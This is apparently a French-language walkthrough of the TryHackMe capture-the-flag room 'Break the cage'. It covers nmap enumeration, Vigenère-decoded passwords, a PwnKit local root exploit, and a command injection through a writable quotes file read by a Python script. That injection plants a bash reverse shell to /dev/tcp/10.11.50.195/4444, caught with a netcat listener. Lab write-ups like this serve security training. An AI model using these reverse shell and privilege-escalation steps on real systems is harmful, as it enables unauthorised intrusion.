# ROOM : Break the cage 
URL : https://tryhackme.com/room/breakoutthecage1

# Enum
## Nmap
```
# Nmap 7.94 scan initiated Thu Oct 19 05:21:54 2023 as: nmap -sC -sV -p- -oN nmap.txt 10.10.111.203
Nmap scan report for 10.10.111.203
Host is up (0.033s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.50.195
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 19 05:22:17 2023 -- 1 IP address (1 host up) scanned in 22.99 seconds
```
## FTP
Sur le FTP on trouve un fichier du nom de **dad_tasks** 
```
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```
C'est du bas64:
```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.
Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```
En utilisant le site suivant : https://www.boxentriq.com/
On constate que c'est du Vigenere. Mais je n'arrive pas a decoder en utilisant ce site. 

J'ai trouver un autre site qui arrive a le faire : https://www.guballa.de/vigenere-solver
```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.
In case I forget.... M**********************************************s
```
Nous avons le 1er mot de passe.

# Privesc to user
On peux se connecter en SSH avec le compte de Weston et le mdp trouver plus haut.

Il nous faut désormais l'accès au compte de **cage** comme on peu le voir dans le fichier **/etc/passwd** :
```
cage:x:1000:1000:cage:/home/cage:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
weston:x:1001:1001::/home/weston:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```
En utilisant le script LSE.sh, il trouve une vulnérabilité Polkit, on peu donc déjà être root.
```
weston@national-treasure:/tmp$ chmod +x PwnKit
weston@national-treasure:/tmp$ ./PwnKit 
root@national-treasure:/tmp#
```

Mais continions le chemin **normal** ^^

On vois qu'il a un acces sudo ici :
```
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```
Le fichier **bees** contient un script bash:
```
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
```
Je continue mes fouilles.

En regardant dans le dossier /opt je trouve ce script python :
```
/opt/.dads_scripts/spread_the_quotes.py
```
```
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```
On peux écrire dans le fichier présent dans **/opt/.dads_scripts/.files/.quotes**
J'y ajouter un reverse shell dedans et met en place le listener.
```
echo "bash -i >& /dev/tcp/10.11.50.195/4444 0>&1" > .quotes
```
Sur ma kali:
```
nc -lnvp 4444
```
J'ai le shell en tant que cage au bout de quelques minutes.

# Privesc to root
Dans le dossier **/home** de cage on trouve un fichier et un dossier:
```
-rw-rw-r-- 1 cage cage  230 May 26  2020 Super_Duper_Checklist
drwxrwxr-x 2 cage cage 4096 May 25  2020 email_backup
```
Super_Duper_Checklist :
```
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{*****************}
```
Le 1er flag !
Ensuite dans le dossier **email_backup** on trouve 3 mails :

email 1
```
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
```
email 2
```
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
```
email 3
```
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

ha**********ph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage

```
On y trouve la note: haiinspsyanileph
C'est encore du Vigenère. Mais cette fois-ci il faut une clé pour le décoder...

Après pas mal de temps, je constate que ca parle pas mal de sa face. J'utilise le mot FACE comme clé et ca fonctionne !
```
c**************d
```
Nous sommes root.

Dans le dossier **/root/** on retrouve d'autre mail :
email 1
```
root@national-treasure:~/email_backup# cat email_1 
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer

```
email 2
```
root@national-treasure:~/email_backup# cat email_2 
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{**********************************}

Thank you

Sean Archer
```

Et voila, on a fini cette machine. 

Elle était sympa, même si je detestes les chaines de caractères chiffrer... C'est une plaie à rechercher !

Enjoy!
